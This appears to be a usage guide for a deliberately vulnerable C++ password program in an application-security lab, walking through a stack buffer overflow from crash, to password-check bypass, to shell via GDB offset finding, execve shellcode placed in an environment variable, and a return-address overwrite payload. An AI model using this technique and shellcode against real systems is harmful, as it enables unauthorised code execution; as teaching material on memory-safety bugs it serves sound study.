# Usage

## Prerequesties
### Build parameters
```bash
g++ -fno-stack-protector -z execstack stack_overflow.cpp -o stack_overflow
```

### Disable ASLR
```bash
echo 0 > /proc/sys/kernel/randomize_va_space
```

### Tools
- cmake
- gcc/clang
- GDB Peda (https://github.com/longld/peda)

## Normal usage
```bash
./stack_overflow
```
```
Enter a password: 123
FAILED
Entered password: 123
Required password: 1111111111
```

## Deny of service
```python
python3 -c "print('A'*100)" | ./stack_overflow
```
```
Enter a password: FAILED
Entered password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Required password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

## Changing program behavior
```python
python3 -c "print('A'*9 + '\x00' + 'A'*9)" | ./stack_overflow
```
```
Enter a password: SUCCESS
Entered password: AAAAAAAAA
Required password: AAAAAAAAA
```

## Arbitrary code execution

```python
gdb stack_overflow

gdb-peda$ pattern_create 200 pattern.in
Writing pattern of 200 chars to filename "pattern.in"

gdb-peda$ r < pattern.in 
Starting program: /home/talantov/projects/appsec/exploit/build/stack_overflow < pattern.in
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter a password: FAILED
Entered password: AAA%AAsAABAA$AAnAACAA�
Required password: AA$AAnAACAA�

Program received signal SIGSEGV, Segmentation fault.
Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled off'.

Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled on'.


[----------------------------------registers-----------------------------------]
RAX: 0x555555558040 --> 0x7ffff7e23370 --> 0x7ffff7d3b5f0 (<_ZNSoD1Ev>:	endbr64)
RBX: 0x0 
RCX: 0xc00 ('')
RDX: 0x7ffff7e23370 --> 0x7ffff7d3b5f0 (<_ZNSoD1Ev>:	endbr64)
RSI: 0x0 
RDI: 0x7ffff7a1ba70 --> 0x0 
RBP: 0x3241416341414741 ('AGAAcAA2')
RSP: 0x7fffffffde48 ("AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
RIP: 0x555555555388 (<_Z4authv+383>:	ret)
R8 : 0xc ('\x0c')
R9 : 0x55555556b2c0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
R10: 0x7ffff780d560 --> 0xf002200006490 
R11: 0x246 
R12: 0x7fffffffdf78 --> 0x7fffffffe2cc ("/home/talantov/projects/appsec/exploit/build/stack_overflow")
R13: 0x555555555389 (<main(int, char**)>:	endbr64)
R14: 0x555555557d70 --> 0x5555555551c0 (<__do_global_dtors_aux>:	endbr64)
R15: 0x7ffff7ffd040 --> 0x7ffff7ffe2e0 --> 0x555555554000 --> 0x10102464c457f
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x555555555381 <_Z4authv+376>:	call   0x5555555550f0 <_ZNSolsEPFRSoS_E@plt>
   0x555555555386 <_Z4authv+381>:	nop
   0x555555555387 <_Z4authv+382>:	leave  
=> 0x555555555388 <_Z4authv+383>:	ret    
   0x555555555389 <main(int, char**)>:	endbr64 
   0x55555555538d <main(int, char**)+4>:	push   rbp
   0x55555555538e <main(int, char**)+5>:	mov    rbp,rsp
   0x555555555391 <main(int, char**)+8>:	sub    rsp,0x10
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffde48 ("AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0008| 0x7fffffffde50 ("3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0016| 0x7fffffffde58 ("A4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0024| 0x7fffffffde60 ("AA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0032| 0x7fffffffde68 ("gAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0040| 0x7fffffffde70 ("AhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0048| 0x7fffffffde78 ("AAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0056| 0x7fffffffde80 ("NAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000555555555388 in auth () at /home/talantov/projects/appsec/exploit/stack_overflow.cpp:20
20	}

gdb-peda$ pattern_offset AAHAAdAA3AAIAAeAA4
AAHAAdAA3AAIAAeAA4 found at offset: 61
```

```bash
export PWN=`python3 -c 'import sys; sys.stdout.buffer.write(b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")'`

./getenvvar PWN ./stack_oveflow
PWN will be at 0x7fffffffe53f
```

Offset 61 points to return address position. Address **0x7fffffffe53f** points to shellcode position.
```python
(python3 -c "import sys; sys.stdout.buffer.write(b'A'*61 + b'\x3f\xe5\xff\xff\xff\x7f\x00\x00' + b'\n')"; cat) | ./stack_overflow
```

```bash
Enter a password: FAILED
Entered password: AAAAAAAAAAAAAAAAAAAAAC
Required password: AAAAAAAAAAAC
id
uid=1000(talantov) gid=1000(talantov) groups=1000(talantov),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare)
uname -a
Linux talantov-virtual-machine 6.2.0-32-generic #32~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Fri Aug 18 10:40:13 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
```
